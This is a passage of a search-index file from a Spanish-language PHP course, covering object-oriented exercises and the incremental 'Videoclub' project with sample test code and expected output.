<li>Investiga la diferencia entre un paradigma orientado a objetos basado en clases (PHP) respecto a uno basado en prototipos (JavaScript).</li> </ol>"},{"location":"03phpoo.html#objetos","title":"Objetos","text":"<ol> <li><code>301Empleado.php</code>: Crea una clase <code>Empleado</code> con su nombre, apellidos y sueldo. Encapsula las propiedades mediante getters/setters y a\u00f1ade m\u00e9todos para:<ul> <li>Obtener su nombre completo \u2192 <code>getNombreCompleto(): string</code></li> <li>Que devuelva un booleano indicando si debe o no pagar impuestos (se pagan cuando el sueldo es superior a 3333\u20ac) \u2192 <code>debePagarImpuestos(): bool</code></li> </ul> </li> <li><code>302EmpleadoTelefonos.php</code>: Copia la clase del ejercicio anterior y modif\u00edcala. A\u00f1ade una propiedad privada que almacene un array de n\u00fameros de tel\u00e9fonos. A\u00f1ade los siguientes m\u00e9todos:<ul> <li><code>public function anyadirTelefono(int $telefono) : void</code> \u2192 A\u00f1ade un tel\u00e9fono al array</li> <li><code>public function listarTelefonos(): string</code> \u2192 Muestra los tel\u00e9fonos separados por comas</li> <li><code>public function vaciarTelefonos(): void</code> \u2192 Elimina todos los tel\u00e9fonos</li> </ul> </li> <li> <p><code>303EmpleadoConstructor.php</code>: Copia la clase del ejercicio anterior y modif\u00edcala. Elimina los setters de <code>nombre</code> y <code>apellidos</code>, de manera que dichos datos se asignan mediante el constructor (utiliza la sintaxis de PHP7). Si el constructor recibe un tercer par\u00e1metro, ser\u00e1 el sueldo del <code>Empleado</code>. Si no, se le asignar\u00e1 1000\u20ac como sueldo inicial.</p> <p><code>303EmpleadoConstructor8.php</code>: Modifica la clase y utiliza la sintaxis de PHP 8 de promoci\u00f3n de las propiedades del constructor.</p> </li> <li> <p><code>304EmpleadoConstante.php</code>: Copia la clase del ejercicio anterior y modif\u00edcala. A\u00f1ade una constante <code>SUELDO_TOPE</code> con el valor del sueldo que debe pagar impuestos, y modifica el c\u00f3digo para utilizar la constante.</p> </li> <li><code>305EmpleadoSueldo.php</code>: Copia la clase del ejercicio anterior y modif\u00edcala. Cambia la constante por una variable est\u00e1tica <code>sueldoTope</code>, de manera que mediante getter/setter puedas modificar su valor.</li> <li> <p><code>306EmpleadoStatic.php</code>: Copia la clase del ejercicio anterior y modif\u00edcala. Completa el siguiente m\u00e9todo con una cadena HTML que muestre los datos de un empleado dentro de un p\u00e1rrafo y todos los tel\u00e9fonos mediante una lista ordenada (para ello, deber\u00e1s crear un getter para los tel\u00e9fonos):</p> <ul> <li><code>public static function toHtml(Empleado $emp): string</code></li> </ul> <p> Ejercicio 307 </p> </li> <li> <p><code>307Persona.php</code>: Copia la clase del ejercicio anterior en <code>307Empleado.php</code> y modif\u00edcala. Crea una clase <code>Persona</code> que sea padre de <code>Empleado</code>, de manera que <code>Persona</code> contenga el nombre y los apellidos, y en <code>Empleado</code> quede el salario y los tel\u00e9fonos.</p> </li> <li> <p><code>308PersonaH.php</code>: Copia las clases del ejercicio anterior y modif\u00edcalas. Crea en <code>Persona</code> el m\u00e9todo est\u00e1tico <code>toHtml(Persona $p)</code>, y modifica en <code>Empleado</code> el mismo m\u00e9todo <code>toHtml(Persona $p)</code>, pero cambia la firma para que reciba una <code>Persona</code> como par\u00e1metro.     Para acceder a las propiedades del empleado con la persona que recibimos como par\u00e1metro, comprobaremos su tipo:</p> <pre><code>&lt;?php\nclass Empleado extends Persona {\n    /// resto del c\u00f3digo\n\n\n    public static function toHtml(Persona $p): string {\n        if ($p instanceof Empleado) {\n            // Aqui ya podemos acceder a las propiedades y m\u00e9todos de Empleado\n        }\n    }\n}\n</code></pre> </li> <li> <p><code>309PersonaE.php</code>: Copia las clases del ejercicio anterior y modif\u00edcalas. A\u00f1ade en <code>Persona</code> un atributo <code>edad</code> A la hora de saber si un empleado debe pagar impuestos, lo har\u00e1 siempre y cuando tenga m\u00e1s de 21 a\u00f1os y dependa del valor de su sueldo. Modifica todo el c\u00f3digo necesario para mostrar y/o editar la edad cuando sea necesario.</p> </li> <li> <p><code>310PersonaS.php</code>: Copia las clases del ejercicio anterior y modif\u00edcalas. A\u00f1ade nuevos m\u00e9todos que hagan una representaci\u00f3n de todas las propiedades de las clases <code>Persona</code> y <code>Empleado</code>, de forma similar a los realizados en HTML, pero sin que sean est\u00e1ticos, de  manera que obtenga los datos mediante <code>$this</code>.</p> <ul> <li><code>function public __toString(): string</code></li> </ul> </li> </ol> <p>Magic methods</p> <p>El m\u00e9todo <code>__toString()</code> es un m\u00e9todo m\u00e1gico que se invoca autom\u00e1ticamente cuando queremos obtener la representaci\u00f3n en cadena de un objeto.</p> <ol> <li> <p><code>311PersonaA.php</code>: Copia las clases del ejercicio anterior y modif\u00edcalas. Transforma <code>Persona</code> a una clase abstracta donde su m\u00e9todo est\u00e1tico <code>toHtml(Persona $p)</code> tenga que ser redefinido en todos sus hijos.</p> </li> <li> <p><code>312Trabajador.php</code>: Copia las clases del ejercicio anterior y modif\u00edcalas.</p> <ul> <li>Cambia la estructura de clases conforme al gr\u00e1fico respetando todos los m\u00e9todos que ya est\u00e1n hechos.</li> <li><code>Trabajador</code> es una clase abstracta que ahora almacena los <code>telefonos</code> y donde <code>calcularSueldo</code> es un m\u00e9todo abstracto de manera que:<ul> <li>El sueldo de un <code>Empleado</code> se calcula a partir de las horas trabajadas y lo que cobra por hora.</li> <li>Para los <code>Gerente</code>s, su sueldo se incrementa porcentualmente en base a su edad: <code>salario + salario*edad/100</code></li> </ul> </li> </ul> <p> Ejercicio 312 </p> </li> <li> <p><code>313Empresa.php</code>: Utilizando las clases de los ejercicios anteriores:</p> <ul> <li>Crea una clase <code>Empresa</code> que adem\u00e1s del nombre y la direcci\u00f3n, contenga una propiedad con un array de <code>Trabajador</code>es, ya sean <code>Empleado</code>s o <code>Gerente</code>s. </li> <li>A\u00f1ade getters/setters para el nombre y direcci\u00f3n.</li> <li>A\u00f1ade m\u00e9todos para a\u00f1adir y listar los trabajadores.<ul> <li><code>public function anyadirTrabajador(Trabajador $t)</code></li> <li><code>public function listarTrabajadoresHtml() : string</code> -&gt; utiliza <code>Trabajador::toHtml(Persona $p)</code></li> </ul> </li> <li>A\u00f1ade un m\u00e9todo para obtener el coste total en n\u00f3minas.<ul> <li><code>public function getCosteNominas(): float</code> -&gt; recorre los trabajadores e invoca al m\u00e9todo <code>calcularSueldo()</code>.</li> </ul> </li> </ul> </li> <li> <p><code>314EmpresaI.php</code>: Copia las clases del ejercicio anterior y modif\u00edcalas.</p> <ul> <li>Crea un interfaz JSerializable, de manera que ofrezca los m\u00e9todos:<ul> <li><code>toJSON(): string</code> \u2192 utiliza la funci\u00f3n <code>json_encode(mixed)</code>. La idea es obtener la representaci\u00f3n JSON de las propiedades de un objeto. Tendr\u00e1s que recorrerarlas y colocarlas en un mapa que se le pasar\u00e1 a la funci\u00f3n. Por ejemplo: <pre><code>&lt;?php\npublic function toJSON(): string {\n    $mapa = [];\n    foreach ($this as $clave =&gt; $valor) {\n        $mapa[$clave] = $valor;\n    }\n    return json_encode($mapa);\n}\n?&gt;\n</code></pre></li> <li><code>toSerialize(): string</code> \u2192 utiliza la funci\u00f3n <code>serialize(mixed)</code></li> </ul> </li> <li>Modifica todas las clases que no son abstractas para que implementen el interfaz creado.</li> </ul> </li> </ol>"},{"location":"03phpoo.html#proyecto-videoclub-10-teoria-hasta-interfaces","title":"Proyecto Videoclub 1.0 (teor\u00eda hasta interfaces)","text":"<p>En los siguientes ejercicios vamos a simular un peque\u00f1o proyecto de un Videoclub, el cual vamos a realizar mediante un desarrollo incremental y siguiendo la pr\u00e1ctica de programaci\u00f3n en parejas (pair programming).</p> <p>Antes de nada, crea un repositorio privado en GitHub y sube el proyecto actual de Videoclub. Una vez creado, invita a tu compa\u00f1ero al repositorio como colaborador.</p> <ul> <li>Inicializa en local tu repostorio de git, mediante <code>git init</code></li> <li>A\u00f1ade y sube los cambios a tu repositorio, mediante <code>git add .</code> y luego <code>git commit -m 'Inicializando proyecto'.</code></li> <li>Conecta tu repositorio con GitHub y sube los cambios (mira la instrucciones de GitHub: comandos <code>git remote</code> y <code>git push</code>).</li> <li>Tu compa\u00f1ero deber\u00e1 descargar el proyecto con sus credenciales.</li> </ul> <p>Proyecto no real</p> <p>El siguiente proyecto est\u00e1 pensado desde un punto de vista formativo. Algunas de las decisiones que se toman no se deben usar (como hacer <code>echo</code> dentro de las clases) o probar el c\u00f3digo comparando el resultado en el navegador.</p> <p>Cada clase debe ir en un archivo php separado. Para facilitar su implementaci\u00f3n, se muestra la estructura UML del modelo y un fragmento de c\u00f3digo para probar las clases:</p> Creamos el Soporte <ol> <li> <p>Crea una clase para almacenar soportes (<code>Soporte.php</code>). Esta clase ser\u00e1 la clase padre de los diferentes soportes con los que trabaje nuestro videoclub (cintas de v\u00eddeo, videojuegos, etc...):</p> <ul> <li>Crea el constructor que inicialice sus propiedades. F\u00edjate que la clase no tiene m\u00e9todos setters.</li> <li>Definir una constante mediante un propiedad privada denominada <code>IVA</code> con un valor del 21%. Nota: Ojo, las constantes admiten tipos de datos a partir de PHP 8.3.</li> <li>Crear un archivo (<code>inicio.php</code>) para usar las clases y copia el siguiente fragmento:</li> </ul> </li> </ol> C\u00f3digo de pruebaNavegador <pre><code>&lt;?php\ninclude\u00a0\"Soporte.php\";\n\n$soporte1\u00a0=\u00a0new\u00a0Soporte(\"Tenet\",\u00a022,\u00a03);\u00a0\necho\u00a0\"&lt;strong&gt;\"\u00a0.\u00a0$soporte1-&gt;titulo\u00a0.\u00a0\"&lt;/strong&gt;\";\u00a0\necho\u00a0\"&lt;br&gt;Precio:\u00a0\"\u00a0.\u00a0$soporte1-&gt;getPrecio()\u00a0.\u00a0\"\u00a0euros\";\u00a0\necho\u00a0\"&lt;br&gt;Precio\u00a0IVA\u00a0incluido:\u00a0\"\u00a0.\u00a0$soporte1-&gt;getPrecioConIVA()\u00a0.\u00a0\"\u00a0euros\";\n$soporte1-&gt;muestraResumen();\n</code></pre> <p><pre>\nTenet\nPrecio: 3 euros\nPrecio IVA incluido: 3.63 euros\nTenet\n3 \u20ac (IVA no incluido)\n</pre></p> A\u00f1adimos Cinta de Video <ol> <li> <p>Crea la clase <code>CintaVideo</code> la cual hereda de <code>Soporte</code>. A\u00f1ade el atributo <code>duracion</code> y sobreescribe tanto el contructor como el m\u00e9todo <code>muestraResumen</code> (desde <code>CintaVideo</code> deber\u00e1s llamar al m\u00e9todo <code>muestraResumen</code> del padre).</p> <p>A\u00f1ade a <code>inicio.php</code> el c\u00f3digo para probar la clase:</p> </li> </ol> C\u00f3digo de pruebaNavegador <pre><code>&lt;?php\ninclude\u00a0\"CintaVideo.php\";\n\n$miCinta\u00a0=\u00a0new\u00a0CintaVideo(\"Los\u00a0cazafantasmas\",\u00a023,\u00a03.5,\u00a0107);\u00a0\necho\u00a0\"&lt;strong&gt;\"\u00a0.\u00a0$miCinta-&gt;titulo\u00a0.\u00a0\"&lt;/strong&gt;\";\u00a0\necho\u00a0\"&lt;br&gt;Precio:\u00a0\"\u00a0.\u00a0$miCinta-&gt;getPrecio()\u00a0.\u00a0\"\u00a0euros\";\u00a0\necho\u00a0\"&lt;br&gt;Precio\u00a0IVA\u00a0incluido:\u00a0\"\u00a0.\u00a0$miCinta-&gt;getPrecioConIva()\u00a0.\u00a0\"\u00a0euros\";\n$miCinta-&gt;muestraResumen();\n</code></pre> <p><pre>\nLos cazafantasmas\nPrecio: 3.5 euros\nPrecio IVA incluido: 4.06 euros\nPel\u00edcula en VHS:\nLos cazafantasmas\n3.5 \u20ac (IVA no incluido)\nDuraci\u00f3n: 107 minutos\n</pre></p> A\u00f1adimos Dvd <ol> <li> <p>Crea la clase <code>Dvd</code> la cual hereda de <code>Soporte</code>. A\u00f1ade los atributos <code>idiomas</code> y <code>formatoPantalla</code>. A continuaci\u00f3n sobreescribe tanto el contructor como el m\u00e9todo <code>muestraResumen</code>.</p> <p>A\u00f1ade a <code>inicio.php</code> el c\u00f3digo para probar la clase:</p> </li> </ol> C\u00f3digo de pruebaNavegador <pre><code>&lt;?php\ninclude\u00a0\"Dvd.php\";\n\n$miDvd\u00a0=\u00a0new\u00a0Dvd(\"Origen\",\u00a024,\u00a015,\u00a0\"es,en,fr\",\u00a0\"16:9\");\u00a0\necho\u00a0\"&lt;strong&gt;\"\u00a0.\u00a0$miDvd-&gt;titulo\u00a0.\u00a0\"&lt;/strong&gt;\";\u00a0\necho\u00a0\"&lt;br&gt;Precio:\u00a0\"\u00a0.\u00a0$miDvd-&gt;getPrecio()\u00a0.\u00a0\"\u00a0euros\";\u00a0\necho\u00a0\"&lt;br&gt;Precio\u00a0IVA\u00a0incluido:\u00a0\"\u00a0.\u00a0$miDvd-&gt;getPrecioConIva()\u00a0.\u00a0\"\u00a0euros\";\n$miDvd-&gt;muestraResumen();\n</code></pre> <p><pre>\nOrigen\nPrecio: 15 euros\nPrecio IVA incluido: 17.4 euros\nPel\u00edcula en DVD:\nOrigen\n15 \u20ac (IVA no incluido)\nIdiomas:es,en,fr\nFormato Pantalla:16:9\n</pre></p> A\u00f1adimos Juego <ol> <li> <p>Crea la clase <code>Juego</code> la cual hereda de <code>Soporte</code>. A\u00f1ade los atributos <code>consola</code>, <code>minNumJugadores</code> y <code>maxNumJugadores</code>. A continuaci\u00f3n a\u00f1ade el m\u00e9todo <code>muestraJugadoresPosibles</code>, el cual debe mostrar Para un jugador, Para X jugadores o De X a Y jugadores dependiendo de los valores de las atributos creados. Finalmente, sobreescribe tanto el contructor como el m\u00e9todo <code>muestraResumen</code>.</p> <p>A\u00f1ade a <code>inicio.php</code> el c\u00f3digo para probar la clase:</p> </li> </ol> C\u00f3digo de pruebaNavegador <pre><code>&lt;?php\ninclude \"Juego.php\";\n\n$miJuego = new Juego(\"The Last of Us Part II\", 26, 49.99, \"PS4\", 1, 1); \necho \"&lt;strong&gt;\" . $miJuego-&gt;titulo . \"&lt;/strong&gt;\"; \necho \"&lt;br&gt;Precio: \" . $miJuego-&gt;getPrecio() . \" euros\"; \necho \"&lt;br&gt;Precio IVA incluido: \" . $miJuego-&gt;getPrecioConIva() . \" euros\";\n$miJuego-&gt;muestraResumen();\n</code></pre> <p><pre>\nThe Last of Us Part II\nPrecio: 49.99 euros\nPrecio IVA incluido: 57.9884 euros\nJuego para: PS4\nThe Last of Us Part II\n49.99 \u20ac (IVA no incluido)\nPara un jugador\n</pre></p> <p>Llegados a este punto, nuestro modelo es similar al siguiente diagrama:</p> Modelo inicial de Videoclub A\u00f1adimos Cliente <ol> <li> <p>Crear la clase <code>Cliente</code>. El constructor recibir\u00e1 el <code>nombre</code>, <code>numero</code> y <code>maxAlquilerConcurrente</code>, este \u00faltimo pudiendo ser opcional y tomando como valor por defecto 3. Tras ello, a\u00f1ade getter/setter \u00fanicamente a <code>numero</code>, y un getter a <code>numSoportesAlquilados</code> (este campo va a almacenar un contador del total de alquileres que ha realizado). El array de soportes alquilados contedr\u00e1 instancias de clases que hereden de <code>Soporte</code>. Finalmente, a\u00f1ade el m\u00e9todo <code>muestraResumen</code> que muestre el nombre y la cantidad de alquileres (tama\u00f1o del array <code>soportesAlquilados</code>).</p> </li> <li> <p>Dentro de <code>Cliente</code>, a\u00f1ade las siguiente operaciones:</p> <ul> <li><code>tieneAlquilado(Soporte $s): bool</code> \u2192 Recorre el array de soportes y comprueba si est\u00e1 el soporte</li> <li><code>alquilar(Soporte $s): bool</code> \u2192 Debe comprobar si ya tiene el soporte alquilado y si no ha superado el cupo de alquileres. Al alquilar, incrementar\u00e1 el <code>numSoportesAlquilados</code> y almacenar\u00e1 el soporte en el array. Para cada caso debe mostrar un mensaje informando de lo ocurrido.</li> </ul> </li> <li> <p>Seguimos con <code>Cliente</code> para a\u00f1adir las operaciones:</p> <ul> <li><code>devolver(int $numSoporte): bool</code> \u2192 Debe comprobar que el soporte estaba alquilado  y actualizar la cantidad de soportes alquilados. Para cada caso debe mostrar un mensaje informando de lo ocurrido</li> <li><code>listaAlquileres(): void</code> \u2192 Informa de cuantos alquileres tiene el cliente y los muestra.</li> </ul> </li> </ol> <p>Crea el archivo <code>inicio2.php</code> con el siguiente c\u00f3digo fuente para probar la clase:</p> C\u00f3digo de pruebaNavegador <pre><code>&lt;?php\ninclude_once\u00a0\"CintaVideo.php\";\ninclude_once\u00a0\"Dvd.php\";\ninclude_once\u00a0\"Juego.php\";\ninclude_once\u00a0\"Cliente.php\";\n\n//instanciamos un par de objetos cliente\n$cliente1 = new Cliente(\"Bruce Wayne\", 23);\n$cliente2 = new Cliente(\"Clark Kent\", 33);\n\n//mostramos el n\u00famero de cada cliente creado \necho \"&lt;br&gt;El identificador del cliente 1 es: \" . $cliente1-&gt;getNumero();\necho \"&lt;br&gt;El identificador del cliente 2 es: \" . $cliente2-&gt;getNumero();\n\n//instancio algunos soportes \n$soporte1 = new CintaVideo(\"Los cazafantasmas\", 23, 3.5, 107);\n$soporte2 = new Juego(\"The Last of Us Part II\", 26, 49.99, \"PS4\", 1, 1);  \n$soporte3 = new Dvd(\"Origen\", 24, 15, \"es,en,fr\", \"16:9\");\n$soporte4 = new Dvd(\"El Imperio Contraataca\", 4, 3, \"es,en\",\"16:9\");\n\n//alquilo algunos soportes\n$cliente1-&gt;alquilar($soporte1);\n$cliente1-&gt;alquilar($soporte2);\n$cliente1-&gt;alquilar($soporte3);\n\n//voy a intentar alquilar de nuevo un soporte que ya tiene alquilado\n$cliente1-&gt;alquilar($soporte1);\n//el cliente tiene 3 soportes en alquiler como m\u00e1ximo\n//este soporte no lo va a poder alquilar\n$cliente1-&gt;alquilar($soporte4);\n//este soporte no lo tiene alquilado\n$cliente1-&gt;devolver(4);\n//devuelvo un soporte que s\u00ed que tiene alquilado\n$cliente1-&gt;devolver(2);\n//alquilo otro soporte\n$cliente1-&gt;alquilar($soporte4);\n//listo los elementos alquilados\n$cliente1-&gt;listaAlquileres();\n//este cliente no tiene alquileres\n$cliente2-&gt;devolver(2);\n</code></pre> <p><pre>\nEl identificador del cliente 1 es: 23\nEl identificador del cliente 2 es: 33\nAlquilado soporte a: Bruce Wayne\n<p>Pel\u00edcula en VHS:\nLos cazafantasmas\n3.5 \u20ac (IVA no incluido)\nDuraci\u00f3n: 107 minutos</p>\n<p>Alquilado soporte a: Bruce Wayne</p>\n<p>Juego para: PS4\nThe Last of Us Part II\n49.99 \u20ac (IVA no incluido)\nPara un jugador</p>\n<p>Alquilado soporte a: Bruce Wayne</p>\n<p>Pel\u00edcula en DVD:\nOrigen\n15 \u20ac (IVA no incluido)\nIdiomas:es,en,fr\nFormato Pantalla:16:9</p>\n<p>El cliente ya tiene alquilado el soporte Los cazafantasmas</p>\n<p>Este cliente tiene 3 elementos alquilados. No puede alquilar m\u00e1s en este videoclub hasta que no devuelva algo</p>\n<p>No se ha podido encontrar el soporte en los alquileres de este cliente</p>\n<p>No se ha podido encontrar el soporte en los alquileres de este cliente</p>\n<p>Este cliente tiene 3 elementos alquilados. No puede alquilar m\u00e1s en este videoclub hasta que no devuelva algo</p>\n<p>El cliente tiene 3 soportes alquilados</p>\n<p>Pel\u00edcula en VHS:\nLos cazafantasmas\n3.5 \u20ac (IVA no incluido)\nDuraci\u00f3n: 107 minutos</p>\n<p>Juego para: PS4\nThe Last of Us Part II\n49.99 \u20ac (IVA no incluido)\nPara un jugador</p>\n<p>Pel\u00edcula en DVD:\nOrigen\n15 \u20ac (IVA no incluido)\nIdiomas:es,en,fr\nFormato Pantalla:16:9</p>\n<p>Este cliente no tiene alquilado ning\u00fan elemento\n</p>\n\n\n\n<ol>\n<li>Llegado a este punto, vamos a relacionar los clientes y los soportes mediante la clase <code>Videoclub</code>. As\u00ed pues crea la clase que representa el gr\u00e1fico, teniendo en cuenta que:<ul>\n<li><code>productos</code> es un array de <code>Soporte</code></li>\n<li><code>socios</code> es una array de <code>Cliente</code></li>\n<li>Los m\u00e9todos p\u00fablicos de incluir alg\u00fan soporte, crear\u00e1n la instancia de la clase correspondiente y llamar\u00e1n al m\u00e9todo privado de <code>incluirProducto</code>, el cual es el encargado de introducirlo dentro del array.</li>\n</ul>\n</li>\n</ol>\n<p>El modelo completo quedar\u00e1 de la siguiente manera:</p>\n\n    \n    Modelo completo de Videoclub\n\n\n<p>Y para probar el proyecto, dentro <code>inicio3.php</code> colocaremos:</p>\nC\u00f3digo de pruebaNavegador\n\n\n<pre><code>&lt;?php\ninclude_once \"Videoclub.php\"; // No incluimos nada m\u00e1s\n\n$vc = new Videoclub(\"Severo 8A\"); \n\n//voy a incluir unos cuantos soportes de prueba \n$vc-&gt;incluirJuego(\"God of War\", 19.99, \"PS4\", 1, 1); \n$vc-&gt;incluirJuego(\"The Last of Us Part II\", 49.99, \"PS4\", 1, 1);\n$vc-&gt;incluirDvd(\"Torrente\", 4.5, \"es\",\"16:9\"); \n$vc-&gt;incluirDvd(\"Origen\", 4.5, \"es,en,fr\", \"16:9\"); \n$vc-&gt;incluirDvd(\"El Imperio Contraataca\", 3, \"es,en\",\"16:9\"); \n$vc-&gt;incluirCintaVideo(\"Los cazafantasmas\", 3.5, 107); \n$vc-&gt;incluirCintaVideo(\"El nombre de la Rosa\", 1.5, 140); \n\n//listo los productos \n$vc-&gt;listarProductos(); \n\n//voy a crear algunos socios \n$vc-&gt;incluirSocio(\"Amancio Ortega\"); \n$vc-&gt;incluirSocio(\"Pablo Picasso\", 2); \n\n$vc-&gt;alquilarSocioProducto(1,2); \n$vc-&gt;alquilarSocioProducto(1,3); \n//alquilo otra vez el soporte 2 al socio 1. \n// no debe dejarme porque ya lo tiene alquilado \n$vc-&gt;alquilarSocioProducto(1,2); \n//alquilo el soporte 6 al socio 1. \n//no se puede porque el socio 1 tiene 2 alquileres como m\u00e1ximo \n$vc-&gt;alquilarSocioProducto(1,6); \n\n//listo los socios \n$vc-&gt;listarSocios();\n</code></pre>\n\n\n<p><pre>\nIncluido soporte 0\nIncluido soporte 1\nIncluido soporte 2\nIncluido soporte 3\nIncluido soporte 4\nIncluido soporte 5\nIncluido soporte 6\n<p>Listado de los 7 productos disponibles:\n1.- Juego para: PS4\nGod of War\n19.99 \u20ac (IVA no incluido)\nPara un jugador\n2.- Juego para: PS4\nThe Last of Us Part II\n49.99 \u20ac (IVA no incluido)\nPara un jugador\n3.- Pel\u00edcula en DVD:\nTorrente\n4.5 \u20ac (IVA no incluido)\nIdiomas:es\nFormato Pantalla:16:9\n4.- Pel\u00edcula en DVD:\nOrigen\n4.5 \u20ac (IVA no incluido)\nIdiomas:es,en,fr\nFormato Pantalla:16:9\n5.- Pel\u00edcula en DVD:\nEl Imperio Contraataca\n3 \u20ac (IVA no incluido)\nIdiomas:es,en\nFormato Pantalla:16:9\n6.- Pel\u00edcula en VHS:\nLos cazafantasmas\n3.5 \u20ac (IVA no incluido)\nDuraci\u00f3n: 107 minutos\n7.- Pel\u00edcula en VHS:\nEl nombre de la Rosa\n1.5 \u20ac (IVA no incluido)\nDuraci\u00f3n: 140 minutos</p>\n<p>Incluido socio 0\nIncluido socio 1</p>\n<p>Alquilado soporte a: Pablo Picasso</p>\n<p>Pel\u00edcula en DVD:\nTorrente\n4.5 \u20ac (IVA no incluido)\nIdiomas:es\nFormato Pantalla:16:9</p>\n<p>** Alquilado soporte a**: Pablo Picasso</p>\n<p>Pel\u00edcula en DVD:\nOrigen\n4.5 \u20ac (IVA no incluido)\nIdiomas:es,en,fr\nFormato Pantalla:16:9</p>\n<p>El cliente ya tiene alquilado el soporte Torrente</p>\n<p>Este cliente tiene 2 elementos alquilados. No puede alquilar m\u00e1s en este videoclub hasta que no devuelva algo</p>\n<p>Listado de 2 socios del videoclub:\n1.- Cliente 0: Amancio Ortega\nAlquileres actuales: 0\n2.- Cliente 1: Pablo Picasso\nAlquileres actuales: 2\n</p>\n\n\n\n<ol>\n<li>\n<p>Transforma <code>Soporte</code> a una clase abstracta y comprueba que todo sigue funcionando. \u00bfQu\u00e9 conseguimos al hacerla abstracta?</p>\n</li>\n<li>\n<p>Crea un interfaz <code>Resumible</code>, de manera que las clases que lo implementen deben ofrecer el m\u00e9todo <code>muestraResumen()</code>. Modifica la clase <code>Soporte</code> y haz que implemente el interfaz. \u00bfHace falta que tambi\u00e9n lo implementen los hijos?</p>\n</li>\n</ol>"},{"location":"03phpoo.html#proyecto-videoclub-20-teoria-hasta-el-final","title":"Proyecto Videoclub 2.0 (teor\u00eda hasta el final)","text":"<p>Antes de comenzar con la segunda parte del videoclub, crea una etiqueta mediante <code>git tag</code> con el nombre <code>v0.329</code> y sube los cambios a GitHub.</p>\n<ol>\n<li>Modifica la operaci\u00f3n de alquilar en <code>Videoclub</code>, para dar soporte al encadenamiento de m\u00e9todos. \nPosteriormente, modifica el c\u00f3digo de prueba para utilizar esta t\u00e9cnica, de tal forma que quede as\u00ed:</li>\n</ol>\n<pre><code>    $vc-&gt;alquilarSocioProducto(1,2)-&gt;alquilarSocioProducto(1,3)-&gt;alquilarSocioProducto(1,2)-&gt;alquilarSocioProducto(1,6);\n</code></pre>\n<ol>\n<li>Haciendo uso de namespaces:<ul>\n<li>Coloca todas las clases/interfaces en <code>Dwes\\ProyectoVideoclub</code></li>\n<li>Cada clase debe hacer <code>include_once</code> de los recursos que emplea</li>\n<li>Coloca el/los archivos de prueba en el ra\u00edz (sin espacio de nombres)</li>\n<li>Desde el archivo de pruebas, utiliza <code>use</code> para poder realizar accesos sin cualificar</li>\n<li>Etiqueta los cambios como <code>v0.331</code>.</li>\n</ul>\n</li>\n<li>Reorganiza las carpeta tal como hemos visto en los apuntes: <code>app</code>, <code>test</code> y <code>vendor</code>.<ul>\n<li>Crea un fichero <code>autoload.php</code> para registrar la ruta donde encontrar las clases</li>\n<li>Modifica todo el c\u00f3digo necesario, incluyendo <code>autoload.php</code> donde sea necesario y borrando los includes previos.</li>\n</ul>\n</li>\n<li>A continuaci\u00f3n vamos a crear un conjunto de excepciones de aplicaci\u00f3n. Estas excepciones son simples, no necesitan sobreescribir ning\u00fan m\u00e9todo. As\u00ed pues, crea la excepci\u00f3n de aplicaci\u00f3n <code>VideoclubException</code> en el namespace <code>Dwes\\ProyectoVideoclub\\Util</code>.\nPosteriormente crea los siguientes hijos (deben heredar de <code>VideoclubException</code>), cada uno en su propio archivo:<ul>\n<li><code>SoporteYaAlquiladoException</code></li>\n<li><code>CupoSuperadoException</code></li>\n<li><code>SoporteNoEncontradoException</code></li>\n<li><code>ClienteNoEncontradoException</code></li>\n</ul>\n</li>\n<li>En <code>Cliente</code>, modifica los m\u00e9todos <code>alquilar</code> y <code>devolver</code>, para que hagan uso de las nuevas excepciones (lanz\u00e1ndolas cuando sea necesario) y funcionen como m\u00e9todos encadenados. Destacar que estos m\u00e9todos, no se capturar est\u00e1s excepciones, s\u00f3lo se lanzan.\nEn <code>Videoclub</code>, modifica <code>alquilarSocioProducto</code> para capturar todas las excepciones que ahora lanza <code>Cliente</code> e informar al usuario en consecuencia.</li>\n<li>Vamos a modificar el proyecto para que el videoclub sepa qu\u00e9 productos est\u00e1n o no alquilados:<ul>\n<li>En <code>Soporte</code>, crea una propiedad p\u00fablica cuyo nombre sea <code>alquilado</code> que inicialmente estar\u00e1 a <code>false</code>. Cuando se alquile, se pondr\u00e1 a <code>true</code>. Al devolver, la volveremos a poner a <code>false</code>.</li>\n<li>En <code>Videoclub</code>, crea dos nuevas propiedades y sus getters:<ul>\n<li><code>numProductosAlquilados</code></li>\n<li><code>numTotalAlquileres</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Crea un nuevo m\u00e9todo en <code>Videoclub</code> llamado <code>alquilarSocioProductos(int numCliente, array numerosSoportes)</code>, el cual debe recibir un array con los n\u00fameros de productos a alquilar.\nAntes de alquilarlos, debe comprobar que todos los soportes est\u00e9n disponibles, de manera que si uno no lo est\u00e1, no se le alquile ninguno.</li>\n<li>\n<p>Crea dos nuevos m\u00e9todos en <code>Videoclub</code>, y mediante la definici\u00f3n, deduce qu\u00e9 deben realizar:</p>\n<ul>\n<li><code>devolverSocioProducto(int numCliente, int numeroSoporte)</code></li>\n<li><code>devolverSocioProductos(int numCliente, array numerosSoportes)</code></li>\n</ul>\n<p>Deben soportar el encadenamiento de m\u00e9todos.\nRecuerda actualizar la propiedad <code>alquilado</code> de Soporte.</p>\n</li>\n</ol>\n<p>Cuando hayas realizado todos los ejercicios, crea una etiqueta mediante <code>git tag</code> con el nombre <code>v0.337</code> y sube los cambios a GitHub.</p>"},{"location":"04web.html","title":"Programaci\u00f3n Web","text":"Duraci\u00f3n y criterios de evaluaci\u00f3n <p>Duraci\u00f3n estimada: 12 sesiones</p> Resultado de aprendizaje Criterios de evaluaci\u00f3n 4. Desarrolla aplicaciones Web embebidas en lenguajes de marcas analizando e incorporando funcionalidades seg\u00fan especificaciones. a) Se han identificado los mecanismos disponibles para el mantenimiento de la informaci\u00f3n que concierne a un cliente web concreto y se han se\u00f1alado sus ventajas. b) Se han utilizado sesiones para mantener el estado de las aplicaciones Web.  c) Se han utilizado cookies para almacenar informaci\u00f3n en el cliente Web y para recuperar su contenido.  d) Se han identificado y caracterizado los mecanismos disponibles para la autentificaci\u00f3n de usuarios.  e) Se han escrito aplicaciones que integren mecanismos de autentificaci\u00f3n de usuarios.  f) Se han realizado adaptaciones a aplicaciones Web existentes como gestores de contenidos u otras.  g) Se han utilizado herramientas y entornos para facilitar la programaci\u00f3n, prueba y depuraci\u00f3n del c\u00f3digo."},{"location":"04web.html#41-variables-de-servidor","title":"4.1 Variables de servidor","text":"<p>PHP almacena la informaci\u00f3n del servidor y de las peticiones HTTP en seis arrays globales:</p> <ul> <li><code>$_ENV</code>: informaci\u00f3n sobre las variables de entorno</li> <li><code>$_GET</code>: par\u00e1metros enviados en la petici\u00f3n GET</li> 